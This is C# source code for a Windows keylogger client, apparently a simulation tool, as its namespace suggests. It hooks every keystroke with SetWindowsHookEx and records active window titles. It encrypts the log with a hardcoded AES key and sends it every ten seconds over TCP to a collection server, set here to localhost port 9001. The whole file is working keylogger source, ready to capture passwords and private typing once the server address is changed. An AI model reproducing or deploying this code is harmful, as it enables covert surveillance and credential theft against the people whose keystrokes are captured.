using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.IO;
using System.Security.Cryptography;

namespace Keylogger_Sim_Tool__Client
{
    internal class Program
    {
        private static StringBuilder logBuffer = new StringBuilder();
        private static string serverIP = "127.0.0.1";
        private static int serverPort = 9001;
        private static TcpClient client;
        private static NetworkStream stream;

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static string lastWindowTitle = "";
        private static readonly byte[] aesKey = Encoding.UTF8.GetBytes("ThisIsASecretKey");
        private static readonly byte[] aesIV = Encoding.UTF8.GetBytes("ThisIsAnInitVect");


        static void Main(string[] args)
        {
            Console.WriteLine("Starting Keylogger Client...");

            // Setup hook
            _hookID = SetHook(_proc);
            Console.WriteLine("Keyboard hook installed.");

            // Start sender thread
            Thread senderThread = new Thread(LogSender);
            senderThread.IsBackground = true;
            senderThread.Start();

            Application.Run();

            UnhookWindowsHookEx(_hookID);
        }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;
                string currentWindow = GetActiveWindowTitle();

                if (currentWindow != lastWindowTitle)
                {
                    logBuffer.AppendLine($"\n[Window: {currentWindow}]");
                    lastWindowTitle = currentWindow;
                }

                logBuffer.Append(key + " ");
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
                return Buff.ToString();

            return "Unknown";
        }

        private static void LogSender()
        {
            while (true)
            {
                try
                {
                    if (client == null || !client.Connected)
                    {
                        Console.WriteLine("Attempting connection to server...");
                        client = new TcpClient(serverIP, serverPort);
                        stream = client.GetStream();
                        Console.WriteLine("Connected to server.");
                    }

                    if (logBuffer.Length > 0)
                    {
                        string rawLog = logBuffer.ToString();

                        Console.WriteLine("\n[LOG BUFFER]");
                        Console.WriteLine(rawLog);

                        string encryptedLog = Encrypt(rawLog);
                        byte[] data = Encoding.UTF8.GetBytes(encryptedLog);

                        stream.Write(data, 0, data.Length);
                        stream.Flush();

                        Console.WriteLine("Encrypted log sent.");
                        logBuffer.Clear();
                    }

                }
                catch (Exception ex)
                {
                    Console.WriteLine("Connection failed or lost: " + ex.Message);
                    client?.Close();
                    client = null;
                    Thread.Sleep(5000);
                }

                Thread.Sleep(10000);
            }
        }

        //aes128
        private static string Encrypt(string plainText)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = aesKey;
                aesAlg.IV = aesIV;
                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                byte[] encrypted;
                using (var msEncrypt = new System.IO.MemoryStream())
                using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                using (var swEncrypt = new StreamWriter(csEncrypt))
                {
                    swEncrypt.Write(plainText);
                    swEncrypt.Flush();
                    csEncrypt.FlushFinalBlock();
                    encrypted = msEncrypt.ToArray();
                }

                return Convert.ToBase64String(encrypted);
            }
        }

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
    }
}